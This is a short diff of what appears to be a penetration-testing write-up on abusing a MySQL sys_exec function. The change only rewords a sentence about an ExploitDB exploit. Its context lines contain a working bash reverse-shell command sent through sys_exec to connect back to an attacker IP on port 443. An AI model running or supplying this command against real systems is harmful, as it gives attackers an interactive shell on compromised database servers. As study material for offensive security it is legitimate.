@@ -51,4 +51,4 @@ You could spawn a shell with something like this:
 ```select sys_exec('/bin/bash -c \'bash -i >& /dev/tcp/"192.168.1.29"/443 0>&1\'');```
 
 ### ExploitDB:
-There's an exploit that does something very similar (https://www.exploit-db.com/exploits/46249) but different environments will require making changes to the exploit code so I'd rather just do it in two lines manually.
+There's an exploit that does something very similar (https://www.exploit-db.com/exploits/46249) but different environments will require making changes to the exploit code and, often, multiple reuploads to the target. So I'd rather just do it manually and in two lines.
